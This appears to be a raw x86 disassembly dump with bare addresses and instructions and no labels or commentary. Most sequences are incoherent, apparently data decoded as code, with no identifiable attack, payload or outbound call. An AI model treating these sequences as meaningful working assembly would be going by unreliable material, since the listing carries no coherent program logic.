  405e2e:	adc    eax,0x100a618
  405e33:	push   esi
  405e34:	inc    edx
  405e35:	pop    eax
  405e36:	inc    edi
  405e37:	add    BYTE PTR [edx+0x6116082],dl
  405e3d:	and    DWORD PTR [edx+0x11],ecx
  405e40:	inc    ebp
  405e41:	add    BYTE PTR [edx],bl
  405e43:	add    cl,BYTE PTR [ebp+0x5]
  405e46:	push   eax
  405e47:	inc    ecx
  405e48:	or     BYTE PTR [ecx+0x0],0xf
  405e4c:	add    BYTE PTR [eax+0x42],dl
  405e4f:	and    BYTE PTR [ebp+0x10900e92],0xac
  405e56:	add    BYTE PTR [eax],al
  405e58:	inc    edx
  405e59:	add    BYTE PTR [eax+0x50081400],cl
  405e5f:	mov    BYTE PTR [esi],al
  405e61:	and    BYTE PTR [eax],al
  405e63:	or     al,BYTE PTR [edx+0xd0014]
  405e69:	add    BYTE PTR [eax],0x4
  405e6c:	add    BYTE PTR [eax+0x1],ah
  405e6f:	popa   
  405e70:	add    al,0xb1
  405e72:	mov    al,ds:0x2206d10
  405e77:	mov    al,ds:0xa24028
  405e7c:	ins    BYTE PTR es:[edi],dx
  405e7d:	adc    BYTE PTR [eax],al
  405e7f:	loopne 0x405e8a
  405e81:	adc    BYTE PTR [eax+eiz*2-0x80],al
  405e85:	add    BYTE PTR [eax],al
  405e87:	add    BYTE PTR [eax],cl
  405e89:	add    BYTE PTR [eax],al
  405e8b:	add    al,0x40
  405e8d:	add    DWORD PTR [eax+0x20000810],eax
  405e93:	cmp    al,0x0
  405e95:	and    al,0x60
  405e97:	add    BYTE PTR [eax],0x80
  405e9a:	clc    
  405e9b:	push   es
  405e9c:	add    BYTE PTR [eax],dl
  405e9e:	dec    edx
  405e9f:	add    dl,BYTE PTR [eax+0x422001]
  405ea5:	sub    al,BYTE PTR [esi]
  405ea7:	sbb    dl,BYTE PTR [eax+0x40]
  405eaa:	add    al,BYTE PTR [ecx]
  405eac:	mov    eax,ds:0x9630a4b0
  405eb1:	xchg   edx,eax
  405eb2:	dec    eax
  405eb3:	and    BYTE PTR [edx],al
  405eb5:	add    al,0x92
  405eb7:	and    BYTE PTR [eax],al
  405eb9:	or     DWORD PTR [eax],eax
  405ebb:	inc    ecx
  405ebc:	add    BYTE PTR [eax+0x40],al
  405ebf:	inc    ecx
  405ec0:	adc    dl,BYTE PTR [ecx+0x20]
  405ec3:	add    BYTE PTR [eax+ecx*1-0x7ffff800],al
  405eca:	add    cl,al
  405ecc:	inc    eax
  405ecd:	add    al,0x0
  405ecf:	add    BYTE PTR [ebx+0x1],cl
  405ed2:	adc    BYTE PTR [ecx],al
  405ed4:	adc    al,0x9
  405ed6:	cdq    
  405ed7:	add    BYTE PTR [ecx+ecx*4+0x14405],ah
  405ede:	test   BYTE PTR [eax],al
  405ee0:	sbb    BYTE PTR [esi],ah
  405ee2:	loopne 0x405ee4
  405ee4:	add    BYTE PTR [esi],dl
  405ee6:	adc    DWORD PTR [eax],0x8884410
  405eec:	xor    BYTE PTR [ebx+edx*1],al
  405eef:	and    BYTE PTR [eax+0xb64248],bl
  405ef5:	adc    al,0x22
  405ef7:	and    BYTE PTR [eax+0x12],ah
  405efa:	nop
  405efb:	test   BYTE PTR [edx],al
  405efd:	adc    BYTE PTR [ecx+ecx*4],cl
  405f00:	add    BYTE PTR [eax+eax*1+0x40044080],0x0
  405f08:	nop
  405f09:	or     BYTE PTR [ecx+ecx*1+0x0],ah
  405f0d:	adc    BYTE PTR [ecx],cl
  405f0f:	add    BYTE PTR [esi],bl
  405f11:	mov    WORD PTR [eax],es
  405f13:	add    al,0x92
  405f15:	and    DWORD PTR [eax],eax
  405f17:	add    DWORD PTR [edx],eax
  405f19:	xor    DWORD PTR [eax+0x0],0xa
  405f1d:	add    BYTE PTR [eax],cl
  405f1f:	add    dl,BYTE PTR [eax]
  405f21:	and    BYTE PTR [eax],0x0
  405f24:	mov    DWORD PTR [ebx],eax
  405f26:	add    DWORD PTR [eax+0x4003801],eax
  405f2c:	push   edi
  405f2d:	adc    BYTE PTR [ecx+eax*1],ah
  405f30:	add    BYTE PTR [esp+eax*1],al
  405f33:	adc    DWORD PTR [eax],eax
  405f35:	rol    DWORD PTR [eax+0x0],0x80
  405f39:	inc    esi
  405f3a:	add    DWORD PTR [eax+eax*8],ebx
  405f3d:	and    BYTE PTR [eax+0x40505005],ah
  405f43:	add    BYTE PTR [eax],ah
  405f45:	inc    eax
  405f46:	adc    BYTE PTR [eax+0x0],cl
  405f49:	add    al,0x4
  405f4b:	xor    al,0x51
  405f4d:	mov    BYTE PTR [eax],dl
  405f4f:	add    BYTE PTR [ecx],al
  405f51:	add    DWORD PTR [eax-0x80],eax
  405f54:	add    BYTE PTR [eax],al
  405f56:	and    al,0xa
  405f58:	add    BYTE PTR [edx+edx*8],dl
  405f5b:	add    al,0x43
  405f5d:	add    BYTE PTR [eax+0x48448],cl
  405f63:	or     BYTE PTR [eax],al
  405f65:	mov    BYTE PTR [eax],ah
  405f67:	xchg   ecx,eax
  405f68:	inc    eax
  405f69:	add    BYTE PTR [eax-0x60],0x41
  405f6d:	add    BYTE PTR [edx+0x40],cl
  405f70:	adc    BYTE PTR [eax],al
  405f72:	xchg   BYTE PTR [eax+0xc430],al
  405f78:	inc    edx
  405f79:	xchg   ebx,eax
  405f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f7b:	or     DWORD PTR [eax],eax
  405f7d:	add    BYTE PTR [eax],al
  405f7f:	add    BYTE PTR [ebx],al
  405f81:	and    BYTE PTR [eax],dl
  405f83:	add    DWORD PTR [eax],ecx
  405f85:	adc    eax,0x360081
  405f8a:	and    BYTE PTR [eax],al
  405f8c:	add    cl,ah
  405f8e:	or     BYTE PTR [eax+0x10],al
  405f91:	enter  0x1002,0x60
  405f95:	push   eax
  405f96:	xchg   BYTE PTR [eax],al
  405f98:	add    dl,BYTE PTR [eax]
  405f9a:	inc    eax
  405f9b:	inc    esp
  405f9c:	and    BYTE PTR [ecx+0x200692a],al
  405fa2:	add    BYTE PTR [eax-0x7fd3ff30],ah
  405fa8:	sub    BYTE PTR [ebx],al
  405faa:	add    al,0x24
  405fac:	add    al,BYTE PTR [eax]
  405fae:	adc    BYTE PTR [edx+0x8603c5],al
  405fb4:	ret    0x6001
  405fb7:	add    BYTE PTR [ecx+0x0],ah
  405fba:	or     BYTE PTR [eax+0x2],cl
  405fbd:	or     al,0xd0
  405fbf:	and    BYTE PTR ss:[edx-0x79ffbf38],al
  405fc6:	inc    ecx
  405fc7:	add    al,0x45
  405fc9:	inc    ebp
  405fca:	rcl    BYTE PTR [eax+0x12],0x12
  405fce:	repnz add DWORD PTR fs:[eax+ecx*4],edi
  405fd3:	add    BYTE PTR [eax],al
  405fd5:	inc    eax
  405fd6:	and    BYTE PTR [eax+eax*2],ch
  405fd9:	xor    DWORD PTR [esp+eax*1],edx
  405fdc:	xchg   edx,eax
  405fdd:	inc    eax
  405fde:	push   ecx
  405fdf:	or     BYTE PTR [eax+0x0],cl
  405fe2:	add    BYTE PTR [ecx+0x14940000],cl
  405fe8:	inc    eax
  405fe9:	add    BYTE PTR [eax],ah
  405feb:	add    al,al
  405fed:	add    BYTE PTR [eax+esi*1],cl
  405ff0:	pop    es
  405ff1:	or     BYTE PTR [eax],dl
  405ff3:	add    eax,0x394602
  405ff8:	add    BYTE PTR [eax],bh
  405ffa:	test   DWORD PTR [eax+0x0],eax
  405ffd:	adc    cl,BYTE PTR [eax]
  405fff:	inc    eax
  406000:	mov    eax,DWORD PTR [esi]
  406002:	adc    BYTE PTR [eax+0x2202000],0x24
  406009:	add    al,0x8d
  40600b:	imul   eax,DWORD PTR [edx-0x80],0x2004000
  406012:	push   es
  406013:	add    BYTE PTR [eax+0x0],cl
  406016:	xor    BYTE PTR [eax],0x2
  406019:	popa   
  40601a:	test   BYTE PTR [eax],ah
  40601c:	and    DWORD PTR [ebx+0x4002400],eax
  406022:	mov    al,0x20
  406024:	dec    eax
  406025:	push   ebp
  406026:	rcl    BYTE PTR [eax],0x40
  406029:	sub    BYTE PTR [ecx+0x59],bh
  40602c:	adc    BYTE PTR ds:0x240040,dh
  406032:	mov    BYTE PTR [eax],ah
  406034:	or     ah,0x80
  406037:	adc    BYTE PTR [eax],dh
  406039:	cmp    BYTE PTR [eax],al
  40603b:	add    al,0x40
  40603d:	and    BYTE PTR [eax+0x40165435],al
  406043:	add    BYTE PTR [eax+0x0],cl
  406046:	add    DWORD PTR [eax],edx
  406048:	add    BYTE PTR [ebx],0x10
  40604b:	add    eax,0x84a382c0
  406050:	add    BYTE PTR [eax],ch
  406052:	add    BYTE PTR [eax],al
  406054:	xchg   BYTE PTR [ecx+0x60004060],al
  40605a:	and    DWORD PTR [ecx],esp
  40605c:	and    al,0x21
  40605e:	mov    cl,0x94
  406060:	add    BYTE PTR [eax],dl
  406062:	add    BYTE PTR [ecx+0x61b50420],al
  406068:	and    al,0x0
  40606a:	adc    BYTE PTR [edx+eax*2],al
  40606d:	add    BYTE PTR [eax],al
  40606f:	push   esp
  406070:	inc    eax
  406071:	add    cl,dl
  406073:	and    cl,dl
  406075:	adc    BYTE PTR [eax],al
  406077:	add    BYTE PTR [eax+eax*4+0x0],al
  40607b:	and    DWORD PTR [eax],eax
  40607d:	mov    al,ds:0xeb011880
  406082:	add    BYTE PTR [eax+0x40],0x42
  406086:	add    al,ah
  406088:	add    al,0x60
  40608a:	inc    ebp
  40608b:	add    BYTE PTR [edx],cl
  40608d:	push   0x400cc
  406092:	push   edx
  406093:	pop    eax
  406094:	push   eax
  406095:	inc    eax
  406096:	sbb    BYTE PTR [ebp+ecx*2+0x7c4d0e1],al
  40609d:	and    dl,cl
  40609f:	add    DWORD PTR ds:0x80600038,edx
  4060a5:	or     BYTE PTR [eax],dl
  4060a7:	inc    eax
  4060a8:	dec    esp
  4060a9:	pusha  
  4060aa:	add    BYTE PTR [eax],ah
  4060ac:	nop
  4060ad:	add    BYTE PTR [eax],al
  4060af:	add    BYTE PTR [eax],0x8
  4060b2:	inc    edx
  4060b3:	and    al,bl
  4060b5:	pusha  
  4060b6:	adc    BYTE PTR [eax-0x7ffffff0],al
  4060bc:	add    BYTE PTR [ecx],cl
  4060be:	sbb    al,0x14
  4060c0:	mov    DWORD PTR [eax],eax
  4060c2:	adc    BYTE PTR [esi],dl
  4060c4:	bound  eax,QWORD PTR [eax+0x2]
  4060c7:	add    DWORD PTR [eax+0x0],eax
  4060ca:	add    DWORD PTR [eax+0x5],eax
  4060cd:	ror    BYTE PTR [eax+0x16],1
  4060d0:	add    BYTE PTR [esi+eiz*1],al
  4060d3:	mov    DWORD PTR [eax],eax
  4060d5:	add    eax,DWORD PTR [esp+eax*2+0x600100]
  4060dc:	xor    eax,DWORD PTR [eax]
  4060de:	add    ah,BYTE PTR [eax]
  4060e0:	or     BYTE PTR [eax-0x3fe6af7f],al
  4060e6:	add    eax,0xc84520
  4060eb:	nop
  4060ec:	add    BYTE PTR [eax+eiz*4+0x100426],al
  4060f3:	add    BYTE PTR [ebx],cl
  4060f5:	add    eax,0x6201
  4060fa:	inc    esp
  4060fb:	add    BYTE PTR [ecx-0x3b],al
  4060fe:	or     BYTE PTR [eax],0x4
  406101:	mov    WORD PTR [eax-0x7effaff4],es
  406107:	add    DWORD PTR [ebp+0x8],edx
  40610a:	sbb    BYTE PTR [ecx+0x1501960d],ah
  406110:	mov    al,ds:0x20100080
  406115:	adc    al,0xc0
  406117:	add    BYTE PTR [eax+ecx*4],al
  40611a:	inc    esp
  40611b:	repnz add DWORD PTR [eax+0x40808121],eax
  406122:	add    cl,BYTE PTR [eax+eiz*2]
  406125:	mov    BYTE PTR [eax],al
  406127:	add    al,al
  406129:	add    BYTE PTR [edx],al
  40612b:	inc    eax
  40612c:	xchg   DWORD PTR [edx],edi
  40612e:	add    DWORD PTR [eax],eax
  406130:	add    al,0x0
  406132:	nop
  406133:	or     BYTE PTR [ecx],al
  406135:	add    BYTE PTR [ecx],cl
  406137:	adc    BYTE PTR [edx],al
  406139:	push   ss
  40613a:	add    eax,0x20094a00
  40613f:	or     al,0x6
  406141:	push   ecx
  406142:	xchg   DWORD PTR [esi+0x1aa4618],eax
  406148:	add    al,BYTE PTR [eax]
  40614a:	add    BYTE PTR [eax],dl
  40614c:	or     BYTE PTR [eax],al
  40614e:	adc    BYTE PTR [eax],al
  406150:	xor    al,BYTE PTR [esi+0x21410010]
  406156:	add    BYTE PTR [eax],al
  406158:	add    BYTE PTR [eax],al
  40615a:	inc    edx
  40615b:	inc    esp
  40615c:	push   ebx
  40615d:	and    al,0x50
  40615f:	and    BYTE PTR [eax],al
  406161:	and    dl,al
  406163:	sub    al,0x2
  406165:	add    al,0x52
  406167:	add    BYTE PTR [eax],dl
  406169:	add    al,BYTE PTR [edx+0x800040]
  40616f:	test   al,0x0
  406171:	rol    BYTE PTR [eax+0x45043401],0x20
  406178:	dec    eax
  406179:	fcom   QWORD PTR [eax+0x0]
  40617c:	dec    eax
  40617d:	add    BYTE PTR [eax+0x0],ah
  406180:	xchg   ebx,eax
  406181:	add    BYTE PTR [eax],dl
  406183:	add    al,0x42
  406185:	add    BYTE PTR [eax+0x42],al
  406188:	add    BYTE PTR [eax],al
  40618a:	pop    edx
  40618b:	arpl   WORD PTR [eax],ax
  40618d:	nop
  40618e:	mov    BYTE PTR [eax],ah
  406190:	adc    BYTE PTR [edx],ch
  406192:	add    DWORD PTR [edx],eax
  406194:	add    BYTE PTR [edx+0x10],al
  406197:	add    BYTE PTR [eax],ah
  406199:	and    esi,DWORD PTR [eax]
  40619b:	inc    edx
  40619c:	add    BYTE PTR [eax+ecx*1],al
  40619f:	or     al,BYTE PTR [eax+0x40c6400]
  4061a5:	add    DWORD PTR [eax],eax
  4061a7:	sub    DWORD PTR [ebx],esi
  4061a9:	or     BYTE PTR [eax+0x102],bh
  4061af:	dec    eax
  4061b0:	mov    es,WORD PTR [eax]
  4061b2:	add    al,0x20
  4061b4:	add    dl,dl
  4061b6:	add    BYTE PTR [ecx],al
  4061b8:	and    al,BYTE PTR [edx]
  4061ba:	add    al,BYTE PTR [eax+0x2010000]
  4061c0:	sbb    DWORD PTR ds:0xc8002104,0x310000
  4061ca:	add    DWORD PTR [eax+0x88021b],edx
  4061d0:	and    DWORD PTR [eax],eax
  4061d2:	xchg   edx,eax
  4061d3:	and    BYTE PTR [ecx],0x5
  4061d6:	push   eax
  4061d7:	mov    al,ah
  4061d9:	dec    edi
  4061da:	add    al,0x0
  4061dc:	fadd   QWORD PTR [eax]
  4061de:	inc    esp
  4061df:	and    BYTE PTR [ecx],ah
  4061e1:	and    BYTE PTR [ecx],cl
  4061e3:	or     BYTE PTR [eax],ah
  4061e5:	add    eax,DWORD PTR [eax+0xc200800]
  4061eb:	and    al,0x80
  4061ed:	sbb    eax,0x30109c04
  4061f3:	add    BYTE PTR [eax],ah
  4061f5:	add    DWORD PTR [eax+0x1],eax
  4061f8:	inc    esp
  4061f9:	adc    BYTE PTR [eax],al
  4061fb:	add    BYTE PTR [ecx],al
  4061fd:	inc    eax
  4061fe:	add    BYTE PTR [eax],dl
  406200:	add    DWORD PTR [eax],esp
  406202:	add    BYTE PTR [eax],cl
  406204:	test   al,0x0
  406206:	inc    eax
  406207:	add    DWORD PTR [eax],eax
  406209:	add    BYTE PTR [eax],al
  40620b:	add    BYTE PTR [eax+eiz*4+0x11],0x0
  406210:	add    al,0x80
  406212:	adc    DWORD PTR [eax+eax*1],esi
  406215:	and    DWORD PTR [eax+0x30],ecx
  406218:	add    BYTE PTR [eax],0x40
  40621b:	stos   BYTE PTR es:[edi],al
  40621c:	mov    BYTE PTR [eax+0x221019],al
  406222:	sub    al,0x8
  406224:	add    al,0xc1
  406226:	add    eax,DWORD PTR [ebp+0x1c004d]
  40622c:	or     BYTE PTR [eax+0x2244040],dl
  406232:	inc    eax
  406233:	dec    eax
  406234:	add    al,0x8
  406236:	and    eax,0x28400000
  40623b:	nop
  40623c:	push   ecx
  40623d:	adc    DWORD PTR [eax],ecx
  40623f:	xchg   BYTE PTR [eax+0x40410a02],al
  406245:	add    DWORD PTR [eax],0x4200200
  40624b:	add    BYTE PTR [ebp+0x14680098],al
  406251:	inc    edx
  406252:	pusha  
  406253:	cwde   
  406254:	adc    BYTE PTR [eax],al
  406256:	add    BYTE PTR [esi],cl
  406258:	sub    BYTE PTR [eax-0x7f],ch
  40625b:	rol    DWORD PTR [eax],0x44
  40625e:	sub    DWORD PTR [esi*1+0xe648c0],eax
  406265:	add    DWORD PTR [eax+0x0],ecx
  406268:	inc    eax
  406269:	add    dh,BYTE PTR [eax-0x78]
  40626c:	sub    BYTE PTR [eax+0x40],al
  40626f:	xor    DWORD PTR [eax],eax
  406271:	add    BYTE PTR [ecx+0x0],dh
  406274:	add    BYTE PTR [eax],al
  406276:	pusha  
  406277:	add    BYTE PTR [eax-0x3fbd0000],al
  40627d:	shl    DWORD PTR [eax+0x0],0x28
  406281:	add    BYTE PTR [ecx],al
  406283:	adc    BYTE PTR [eax+0x30],cl
  406286:	inc    eax
  406287:	add    BYTE PTR [eax],cl
  406289:	mov    al,ds:0x4290b00
  40628e:	add    BYTE PTR [ecx],al
  406290:	pop    es
  406291:	add    al,BYTE PTR [eax+0x0]
  406294:	rol    DWORD PTR [eax+ecx*1],1
  406297:	add    BYTE PTR [eax],al
  406299:	add    al,0x19
  40629b:	add    BYTE PTR [eax],al
  40629d:	or     DWORD PTR [edx+0x52],esp
  4062a0:	test   al,0x10
  4062a2:	push   eax
  4062a3:	add    BYTE PTR [edx],al
  4062a5:	add    BYTE PTR [eax],al
  4062a7:	inc    eax
  4062a8:	add    al,al
  4062aa:	and    BYTE PTR [esi+0x22],cl
  4062ad:	adc    BYTE PTR [ecx+eax*1],al
  4062b0:	mov    BYTE PTR [eax],cl
  4062b2:	cmp    al,0x51
  4062b4:	pop    eax
  4062b5:	adc    ah,BYTE PTR [esi+eax*1]
  4062b8:	add    BYTE PTR [eax],al
  4062ba:	inc    eax
  4062bb:	and    BYTE PTR [eax],0xe0
  4062be:	inc    edx
  4062bf:	add    eax,DWORD PTR ds:0x100050
  4062c5:	pop    es
  4062c6:	inc    eax
  4062c7:	push   ecx
  4062c8:	inc    edx
  4062c9:	add    BYTE PTR [eax-0x60],al
  4062cc:	or     BYTE PTR [ecx-0x7667fc00],al
  4062d2:	or     DWORD PTR [edi],esp
  4062d4:	inc    esp
  4062d5:	sbb    al,0x12
  4062d7:	and    al,0x0
  4062d9:	adc    al,0xa
  4062db:	add    BYTE PTR [eax-0x7b5dfdf0],ah
  4062e1:	add    ecx,DWORD PTR [edx]
  4062e3:	dec    esi
  4062e4:	and    BYTE PTR [eax],0x4
  4062e7:	add    BYTE PTR [ebx+0x5000081c],al
  4062ed:	adc    BYTE PTR [eax-0x7ff3edfe],al
  4062f3:	adc    DWORD PTR [eax],eax
  4062f5:	pop    ss
  4062f6:	push   edx
  4062f7:	add    al,0x0
  4062f9:	mov    al,ds:0x880008
  4062fe:	mov    edx,DWORD PTR [eax]
  406300:	ror    BYTE PTR [eax],1
  406302:	hlt    
  406303:	leave  
  406304:	add    DWORD PTR [eax+0x414610],eax
  40630a:	ret    0xc680
  40630d:	add    BYTE PTR [esi],ah
  40630f:	arpl   WORD PTR [eax],ax
  406311:	add    DWORD PTR [eax],ecx
  406313:	add    eax,0x80614106
  406318:	or     BYTE PTR [eax],al
  40631a:	push   esi
  40631b:	push   eax
  40631c:	add    BYTE PTR [eax],al
  40631e:	add    BYTE PTR [eax+eax*4],dl
  406321:	dec    esi
  406322:	and    BYTE PTR [eax],0x4
  406325:	push   es
  406326:	add    al,BYTE PTR [eax]
  406328:	add    BYTE PTR [eax],dh
  40632a:	add    al,0x0
  40632c:	add    BYTE PTR [ebx+eax*2+0x36],ah
  406330:	add    BYTE PTR [eax],al
  406332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406333:	adc    BYTE PTR [eax],ch
  406335:	add    al,0x1
  406337:	adc    cl,BYTE PTR [eax]
  406339:	mov    ebx,0x466c328
  40633e:	add    BYTE PTR [ebx],cl
  406340:	add    BYTE PTR [eax+0x4],cl
  406343:	or     al,0x68
  406345:	and    al,BYTE PTR [esp+ecx*2]
  406348:	add    BYTE PTR [eax+edx*1],dh
  40634b:	adc    al,0x0
  40634d:	add    dl,cl
  40634f:	test   BYTE PTR [ecx],al
  406351:	mov    BYTE PTR ds:0x1021601c,al
  406357:	and    DWORD PTR [eax],esp
  406359:	sub    BYTE PTR [edx+0x60],al
  40635c:	fmul   DWORD PTR [ecx+0x50]
  40635f:	push   es
  406360:	or     BYTE PTR [eax+eax*1],al
  406363:	add    BYTE PTR [ecx],cl
  406365:	adc    al,0x48
  406367:	add    BYTE PTR [eax],al
  406369:	inc    esp
  40636a:	fld    DWORD PTR [esp+eax*1]
  40636d:	add    BYTE PTR [edx],bl
  40636f:	add    BYTE PTR [eax],cl
  406371:	dec    eax
  406372:	and    BYTE PTR [eax+ecx*1+0x321a0020],dl
  406379:	add    BYTE PTR [eax+0x8240],cl
  40637f:	and    al,0x40
  406381:	add    BYTE PTR [eax],al
  406383:	push   0x3401a493
  406388:	and    BYTE PTR [ecx],bl
  40638a:	or     BYTE PTR [eax+0x44],al
  40638d:	adc    BYTE PTR [ecx],cl
  40638f:	add    BYTE PTR [eax],al
  406391:	push   ds
  406392:	add    DWORD PTR [esp+eax*1+0x9100b5],0x20158c0
  40639d:	cmp    eax,0x480a
  4063a2:	inc    eax
  4063a3:	add    BYTE PTR [eax+0x4c],al
  4063a6:	add    DWORD PTR [ecx],eax
  4063a8:	and    BYTE PTR [eax],ah
  4063aa:	and    cl,al
  4063ac:	rol    BYTE PTR [edx],0x10
  4063af:	cmp    eax,0x83008400
  4063b4:	inc    eax
  4063b5:	xchg   DWORD PTR [eax+0x64000],eax
  4063bb:	adc    DWORD PTR [edx],ecx
  4063bd:	xor    al,0x46
  4063bf:	mov    BYTE PTR [eax],0x86
  4063c2:	add    BYTE PTR [edx+0x0],al
  4063c5:	add    BYTE PTR [eax],al
  4063c7:	adc    al,BYTE PTR [eax]
  4063c9:	rol    cl,0x16
  4063cc:	adc    DWORD PTR [eax+ebx*1+0x42],esp
  4063d0:	add    al,BYTE PTR [ecx]
  4063d2:	and    al,0x1
  4063d4:	jno    0x406416
  4063d6:	and    BYTE PTR [ebp+0x10],ah
  4063d9:	or     eax,DWORD PTR [edx+0x0]
  4063dc:	mov    BYTE PTR [eax],al
  4063de:	rol    BYTE PTR [eax],0x40
  4063e1:	div    BYTE PTR [eax]
  4063e3:	mov    BYTE PTR [edx],al
  4063e5:	adc    BYTE PTR [ebx+0x0],dl
  4063e8:	add    dl,0x50
  4063eb:	add    BYTE PTR [eax],al
  4063ed:	pop    ss
  4063ee:	add    BYTE PTR [eax+eax*1],ah
  4063f1:	test   BYTE PTR [eax],dl
  4063f3:	pusha  
  4063f4:	pop    eax
  4063f5:	cmp    al,0x0
  4063f7:	adc    BYTE PTR [eax],al
  4063f9:	add    BYTE PTR [eax],bh
  4063fb:	inc    eax
  4063fc:	dec    ebp
  4063fd:	add    eax,0x420824
  406402:	shr    BYTE PTR [eax-0x7ddd2fe0],1
  406408:	add    al,0xc0
  40640a:	rol    DWORD PTR [eax],1
  40640c:	and    DWORD PTR [eax+0x2],eax
  406412:	add    al,BYTE PTR [ebx]
  406414:	and    BYTE PTR [eax],al
  406416:	add    BYTE PTR [eax],al
  406418:	or     BYTE PTR [eax+0x0],bl
  40641b:	or     BYTE PTR [edx+0x4314a004],al
  406421:	or     BYTE PTR [eax],al
  406423:	add    BYTE PTR [eax],ah
  406425:	add    BYTE PTR [eax],ch
  406427:	add    BYTE PTR [ecx-0x76],dl
  40642a:	ret    0xc180
  40642d:	or     BYTE PTR [edx+eiz*2+0x40],dl
  406431:	add    BYTE PTR [ecx],al
  406433:	and    DWORD PTR [ecx+eax*2],eax
  406436:	add    BYTE PTR [eax],al
  406438:	push   esp
  406439:	dec    ecx
  40643a:	dec    edx
  40643b:	call   0xb14066c0
  406440:	bound  esi,QWORD PTR [ecx+0x640130]
  406446:	rol    BYTE PTR [esi],0x40
  406449:	mov    al,ds:0x40c8a10
  40644e:	adc    BYTE PTR [eax],al
  406450:	add    BYTE PTR [edx+0x40020000],al
  406456:	loopne 0x406458
  406458:	test   BYTE PTR [eax],al
  40645a:	inc    edx
  40645b:	add    al,al
  40645d:	or     ah,BYTE PTR [eax]
  40645f:	inc    edx
  406460:	add    DWORD PTR [ecx+eiz*4],eax
  406463:	add    BYTE PTR [eax],bl
  406465:	adc    DWORD PTR [eax+0x239060],edx
  40646b:	add    BYTE PTR [eax],al
  40646d:	inc    eax
  40646e:	adc    BYTE PTR [eax+0x0],al
  406471:	adc    BYTE PTR [ecx],ah
  406473:	add    al,0x8
  406475:	pusha  
  406476:	push   0x12
  406478:	add    DWORD PTR [eax],eax
  40647a:	add    BYTE PTR [eax],cl
  40647c:	test   BYTE PTR [ecx+0x4],ch
  40647f:	or     BYTE PTR [ebx],ch
  406481:	sbb    BYTE PTR [eax],bl
  406483:	xor    ah,bh
  406485:	add    BYTE PTR [eax],al
  406487:	add    BYTE PTR [eax],dl
  406489:	cmp    DWORD PTR [edx],esp
  40648b:	xor    BYTE PTR [eax+0x0],al
  40648e:	add    BYTE PTR [edx],al
  406490:	add    BYTE PTR [ecx],0x6
  406493:	inc    eax
  406494:	push   eax
  406495:	add    BYTE PTR [ecx],al
  406497:	push   ss
  406498:	adc    al,0x0
  40649a:	add    BYTE PTR [edx+0x0],0x8
  40649e:	inc    edx
  40649f:	pusha  
  4064a0:	adc    BYTE PTR [ecx-0x80000000],dl
  4064a6:	add    BYTE PTR [edx+0x2],al
  4064a9:	adc    BYTE PTR [edx],dl
  4064ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ac:	add    BYTE PTR [eax+0x24],al
  4064af:	add    al,0x64
  4064b1:	add    BYTE PTR [eax],al
  4064b3:	jo     0x4064db
  4064b5:	adc    al,0xe0
  4064b7:	inc    esi
  4064b8:	add    cl,ch
  4064ba:	add    BYTE PTR [eax+eax*1+0x0],al
  4064be:	adc    BYTE PTR [eax+ecx*1],cl
  4064c1:	inc    esp
  4064c2:	sub    eax,0x90484400
  4064c7:	adc    BYTE PTR [eax],cl
  4064c9:	inc    edx
  4064ca:	adc    DWORD PTR [eax+eax*1+0x40],eax
  4064ce:	and    ah,cl
  4064d0:	push   eax
  4064d1:	or     DWORD PTR [eax],0xc000846
  4064d7:	sbb    al,0x60
  4064d9:	add    BYTE PTR [eax],al
  4064db:	push   eax
  4064dc:	and    BYTE PTR [esi],ah
  4064de:	sbb    BYTE PTR [eax],al
  4064e0:	adc    BYTE PTR [eax],dl
  4064e2:	add    ch,al
  4064e4:	jmp    0xa0506629
  4064e9:	add    BYTE PTR [eax],al
  4064eb:	and    al,al
  4064ed:	add    BYTE PTR [eax],al
  4064ef:	add    al,ah
  4064f1:	inc    eax
  4064f2:	add    BYTE PTR [eax+0x20c00615],ah
  4064f8:	add    BYTE PTR [eax],al
  4064fa:	or     BYTE PTR [eax],al
  4064fc:	add    BYTE PTR [ecx],0x84
  4064ff:	adc    BYTE PTR [edx],0x0
  406502:	nop
  406503:	dec    eax
  406504:	inc    ecx
  406505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406506:	add    BYTE PTR [eax],0x84
  406509:	and    BYTE PTR [ebx+0x59ea7500],cl
  40650f:	add    DWORD PTR [eax-0x80],edx
  406512:	add    BYTE PTR [edx],0x0
  406515:	add    BYTE PTR [ebx],0x0
  406518:	add    BYTE PTR [ecx+0x1],al
  40651b:	loope  0x406530
  40651d:	or     BYTE PTR [eax],al
  40651f:	mov    ah,BYTE PTR [edx+0x15]
  406522:	add    DWORD PTR [edx],esp
  406524:	and    DWORD PTR [eax],eax
  406526:	add    BYTE PTR [ecx],al
  406528:	mov    DWORD PTR [eax+ebx*4+0xca300e],ecx
  40652f:	add    eax,0x45080000
  406534:	add    BYTE PTR [eax],0x0
  406537:	adc    BYTE PTR [edx+0x10],al
  40653a:	add    BYTE PTR [eax],al
  40653c:	ret    0x8042
  40653f:	add    BYTE PTR [eax+0x41],0x0
  406543:	add    al,BYTE PTR [eax]
  406545:	add    BYTE PTR [eax],0x41
  406548:	cmp    BYTE PTR [eax],al
  40654a:	push   0x5
  40654c:	inc    edx
  40654d:	adc    BYTE PTR [edx],cl
  40654f:	add    DWORD PTR [ecx],eax
  406551:	or     BYTE PTR [ebp-0x80],0x70
  406555:	or     al,0x20
  406557:	mov    WORD PTR [eax+0x0],es
  40655a:	add    edx,DWORD PTR [esi]
  40655c:	adc    BYTE PTR [eax],al
  40655e:	add    BYTE PTR [eax+eiz*1],al
  406561:	inc    eax
  406562:	adc    DWORD PTR [eax],eax
  406564:	ret    0x4003
  406567:	xchg   ecx,eax
  406568:	push   es
  406569:	and    BYTE PTR [ecx],al
  40656b:	and    DWORD PTR [ecx],edx
  40656d:	push   eax
  40656e:	inc    eax
  40656f:	add    BYTE PTR [eax],al
  406571:	and    DWORD PTR [eax+0x8c00010],0x22400005
  40657b:	inc    edx
  40657c:	add    BYTE PTR [eax+0x8004943],al
  406582:	add    BYTE PTR [eax],al
  406584:	add    BYTE PTR [eax],al
  406586:	add    BYTE PTR [eax],al
  406588:	add    al,0x40
  40658a:	test   cl,cl
  40658c:	inc    eax
  40658d:	and    al,0x5
  40658f:	pop    esi
  406590:	add    al,0x3e
  406592:	mov    BYTE PTR [ecx],bl
  406594:	clc    
  406595:	inc    eax
  406596:	add    BYTE PTR [eax],al
  406598:	add    eax,DWORD PTR [ecx]
